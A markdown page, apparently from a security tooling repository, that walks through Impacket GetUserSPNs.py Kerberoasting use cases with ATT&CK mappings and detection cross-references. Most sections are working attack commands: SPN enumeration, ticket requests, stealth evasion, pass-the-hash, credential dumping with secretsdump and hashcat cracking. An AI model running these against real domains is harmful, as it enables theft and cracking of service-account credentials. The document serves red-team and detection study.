# Impacket — GetUserSPNs.py (Kerberoasting) — Hands-On Use Cases

Every use case below assumes a domain principal (any principal — see `01 - Overview.md`'s Prerequisites) authenticating to LDAP and Kerberos. **MITRE ATT&CK T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)** applies to every scenario that results in requesting a TGS for an SPN-bearing account; scenarios that are enumeration-only (no TGS-REQ at all) are tagged **T1087.002 (Account Discovery: Domain Account)** instead, since no ticket has been requested yet at that point.

## Contents
- [Baseline Enumeration-Only Pass](#baseline-enumeration-only-pass)
- [Full Kerberoasting Pass Against Every SPN](#full-kerberoasting-pass-against-every-spn)
- [Targeting a Single High-Value Account](#targeting-a-single-high-value-account)
- [Machine-Account SPN Enumeration and Requesting](#machine-account-spn-enumeration-and-requesting)
- [Stealthier Enumeration](#stealthier-enumeration)
- [Saving Raw Tickets vs. Hash-Only Output](#saving-raw-tickets-vs-hash-only-output)
- [Forcing Away From the RC4 Bias](#forcing-away-from-the-rc4-bias)
- [Using an Existing TGT/ccache](#using-an-existing-tgtccache)
- [Pass-the-Hash Authentication](#pass-the-hash-authentication)
- [AES-Key Authentication](#aes-key-authentication)
- [Bulk Targeting a Known Account List](#bulk-targeting-a-known-account-list)
- [No-Preauth AS-REQ-Sourced Ticket Requests](#no-preauth-as-req-sourced-ticket-requests)
- [Cross-Trust Kerberoasting](#cross-trust-kerberoasting)
- [Chained After an Initial Foothold](#chained-after-an-initial-foothold)
- [Chained Into Hashcat for Offline Cracking](#chained-into-hashcat-for-offline-cracking)

---

## Baseline Enumeration-Only Pass

**MITRE ATT&CK:** [T1087.002](https://attack.mitre.org/techniques/T1087/002/) (Account Discovery: Domain Account)

```bash
GetUserSPNs.py CORP.LOCAL/jsmith:'Summer2026!'
```
No `-request`, `-request-user`, `-request-machine`, `-save`, or `-outputfile` — this run **never sends a single TGS-REQ**. It performs the LDAP enumeration pass only, printing the `ServicePrincipalName / Name / MemberOf / PasswordLastSet / LastLogon / Delegation` table, then exits. This is the reconnaissance step an operator runs first to see the target list and spot delegation-flagged accounts before deciding what to actually roast — and it's also the step that, on the target side, is genuinely undetectable via Event 4769 (no TGS-REQ occurred), making the LDAP-side signals in `04 - Target Evidence.md` the only ones that apply to this specific scenario.

## Full Kerberoasting Pass Against Every SPN

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/)

```bash
GetUserSPNs.py -request -outputfile kerberoast_hashes.txt CORP.LOCAL/jsmith:'Summer2026!'
```
The standard "roast everything" run: enumerate every SPN-bearing user account, obtain a TGT for `jsmith`, then send one TGS-REQ per unique account, writing every resulting `$krb5tgs$...` line to `kerberoast_hashes.txt`. This is the loudest, highest-yield, and most detectable variant — a single principal (`jsmith`) generating an Event 4769 for every service account in the domain in rapid succession, which is exactly the burst pattern `05 - Detection and Hunting.md`'s top-ranked hunt is built around.

## Targeting a Single High-Value Account

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/)

```bash
GetUserSPNs.py -request-user svc-sql -outputfile svc-sql.hash CORP.LOCAL/jsmith:'Summer2026!'
```
Narrows the LDAP filter to `(sAMAccountName:=svc-sql)` and requests exactly one TGS. Minimal-footprint variant when an operator already knows (from BloodHound, prior enumeration, or an OSINT hit) which service account is worth pursuing — one Event 4769, not a burst, meaningfully weaker signal for the target-side hunt above.

## Machine-Account SPN Enumeration and Requesting

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (requesting), [T1087.002](https://attack.mitre.org/techniques/T1087/002/) (enumeration leg)

```bash
GetUserSPNs.py -machine-only -request-machine 'FILESRV01$' -outputfile filesrv01.hash CORP.LOCAL/jsmith:'Summer2026!'
```
Switches the LDAP filter to `objectCategory=computer` and narrows to one machine account. Machine-account passwords are long, auto-generated, and effectively never crack in practice (see `01 - Overview.md`'s History section) — this use case is realistically about targeting a **specific** legacy or misconfigured machine account with a known-weak or manually-set password, not a broad sweep.

## Stealthier Enumeration

**MITRE ATT&CK:** [T1087.002](https://attack.mitre.org/techniques/T1087/002/)

```bash
GetUserSPNs.py -stealth -request -outputfile kerberoast_hashes.txt CORP.LOCAL/jsmith:'Summer2026!'
```
Drops the `(servicePrincipalName=*)` clause, forcing the DC to return **every** enabled person object for client-side SPN filtering rather than pre-filtering server-side. This specifically evades detections keyed on the literal `(servicePrincipalName=*)` filter string — Microsoft Defender for Identity ships a dedicated alert for exactly this evasion (`04 - Target Evidence.md`). It does **not** reduce or evade the TGS-REQ burst that follows if `-request` is also used — only the enumeration leg changes shape.

## Saving Raw Tickets vs. Hash-Only Output

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/)

```bash
# Hash-only, for offline cracking (this page's normal case)
GetUserSPNs.py -outputfile kerberoast_hashes.txt CORP.LOCAL/jsmith:'Summer2026!'

# Full tickets, one .ccache per account, for pass-the-ticket / re-use rather than cracking
GetUserSPNs.py -save CORP.LOCAL/jsmith:'Summer2026!'
```
`-outputfile` writes only the crackable `$krb5tgs$...` string per account. `-save` writes the **entire ticket** as `<username>.ccache` — useful when the objective is impersonating that service account directly via pass-the-ticket (`KRB5CCNAME=svc-sql.ccache`) rather than cracking its password offline. Both flags auto-enable `-request`; either can be combined in the same run.

## Forcing Away From the RC4 Bias

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/)

```bash
GetUserSPNs.py -no-rc4 -request -outputfile kerberoast_hashes.txt CORP.LOCAL/jsmith:'Summer2026!'
```
Skips the NTLM-hash-conversion step for the operator's own TGT (see `01 - Overview.md`'s etype-negotiation section) — mostly relevant when the operator's own account or the domain itself has RC4 disabled for TGT issuance and the default behavior would otherwise error or degrade. Note this changes the operator's **own TGT's** etype, not the target service accounts' TGS-REP etype — the TGS-REQ's offered-etype list (RC4 first) is unaffected by this flag, per source.

## Using an Existing TGT/ccache

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/), [T1550.003](https://attack.mitre.org/techniques/T1550/003/) (Use Alternate Authentication Material: Pass the Ticket)

```bash
export KRB5CCNAME=jsmith.ccache
GetUserSPNs.py -k -no-pass -request -outputfile kerberoast_hashes.txt CORP.LOCAL/jsmith
```
Reuses an already-obtained TGT (e.g. from a prior Mimikatz `kerberos::tgt` export, or a Golden/Silver Ticket forged in `Mimikatz/kerberos (Golden-Silver Ticket)/`) instead of authenticating with a password. `getTGT()` checks `KRB5CCNAME` first and only falls back to a fresh AS-REQ if no usable TGT is cached — this is the natural chaining point between a ticket-forging technique and Kerberoasting: forge or steal a TGT, then use it to roast every SPN in the domain without ever needing the forged account's actual password.

## Pass-the-Hash Authentication

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/), [T1550.002](https://attack.mitre.org/techniques/T1550/002/) (Use Alternate Authentication Material: Pass the Hash)

```bash
GetUserSPNs.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  -request -outputfile kerberoast_hashes.txt CORP.LOCAL/jsmith
```
Authenticates with an NTLM hash recovered from a prior credential-dumping step (`secretsdump.py`, Mimikatz `sekurlsa`) rather than a cleartext password — same LDAP/Kerberos flow otherwise.

## AES-Key Authentication

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/)

```bash
GetUserSPNs.py -aesKey a1b2c3...64hexchars -request -outputfile kerberoast_hashes.txt CORP.LOCAL/jsmith
```
Authenticates with a recovered AES128/256 Kerberos key instead of NTLM — the operator's own authentication happens over AES even though the TGS-REQ that follows still offers RC4 first for each target SPN (the two are independent, per `01 - Overview.md`).

## Bulk Targeting a Known Account List

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/)

```bash
GetUserSPNs.py -usersfile spn_targets.txt -outputfile kerberoast_hashes.txt CORP.LOCAL/jsmith:'Summer2026!'
```
Skips the LDAP enumeration step entirely — `spn_targets.txt` lists one account name per line (already known from a prior enumeration pass, BloodHound export, or another operator's earlier reconnaissance). Every listed account gets a TGS-REQ using the operator's own TGT. Lower LDAP footprint than a fresh enumeration pass, at the cost of only covering accounts already on the list.

## No-Preauth AS-REQ-Sourced Ticket Requests

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (Kerberoasting-shaped output), [T1558.004](https://attack.mitre.org/techniques/T1558/004/) (AS-REP Roasting mechanics reused)

```bash
GetUserSPNs.py -no-preauth guestuser -usersfile spn_targets.txt CORP.LOCAL/CORP.LOCAL
```
A niche technique: `-no-preauth <account>` names an account that has Kerberos pre-authentication **disabled**. `GetUserSPNs.py` then sources an AS-REQ (not a TGS-REQ) *as* that account, once per target listed in `-usersfile`, and decodes the response as an `AS_REP` rather than a `TGS_REP`. This produces the same `$krb5tgs$...`-shaped output without ever going through the normal TGT-then-TGS two-step — useful specifically when a preauth-disabled account is already known (e.g. discovered via `GetNPUsers.py`) and the operator wants to source Kerberoast-format hashes for a specific target list using that account as the vector, rather than their own normal credentials.

## Cross-Trust Kerberoasting

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/)

```bash
GetUserSPNs.py -target-domain child.corp.local -request -outputfile cross_domain.hash CORP.LOCAL/jsmith:'Summer2026!'
```
Authenticates as `jsmith@CORP.LOCAL` but enumerates and requests SPNs in `child.corp.local` instead — relevant across a trust relationship where the operator's home domain has a valid trust path to the target domain. The TGS-REQ traffic lands on the **target domain's** DCs, not the operator's home domain's — plan target-side hunting accordingly.

## Chained After an Initial Foothold

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/); the credential-acquisition step carries its own separate ID (e.g. [T1003.002](https://attack.mitre.org/techniques/T1003/002/) if `secretsdump.py` sourced it)

```bash
# Step 1 — obtain any domain credential (any prior tool in this repo's Impacket/ or Mimikatz/ folders)
secretsdump.py -sam foo.sam -system foo.system LOCAL

# Step 2 — that credential is all Kerberoasting needs; no elevated rights required
GetUserSPNs.py -request -outputfile kerberoast_hashes.txt CORP.LOCAL/anyuser:'RecoveredPassword1!'
```
Kerberoasting's low prerequisite bar (**any** valid domain credential — see `01 - Overview.md`) makes it a near-universal next step after literally any credential-access technique lands a foothold, not just a high-privilege one. This is why it shows up early and often in real intrusion chains.

## Chained Into Hashcat for Offline Cracking

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (obtaining the hash) → [T1110.002](https://attack.mitre.org/techniques/T1110/002/) (Brute Force: Password Cracking, the separate cracking step)

```bash
GetUserSPNs.py -request -outputfile kerberoast_hashes.txt CORP.LOCAL/jsmith:'Summer2026!'

# etype-dependent hashcat mode — inspect the leading $krb5tgs$<N>$ to pick the right one
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt -r rules/best66.rule   # RC4  (etype 23)
hashcat -m 19600 kerberoast_hashes.txt rockyou.txt -r rules/best66.rule   # AES128 (etype 17)
hashcat -m 19700 kerberoast_hashes.txt rockyou.txt -r rules/best66.rule   # AES256 (etype 18)
```
The handoff point between this tool and `Hashcat/`. See `Hashcat/02 - Hands-On Use Cases.md`'s "Cracking Kerberoasted TGS-REP Tickets" section for attack-mode selection, rule-file guidance, and why service accounts disproportionately crack — this page's job ends at producing the hash file.
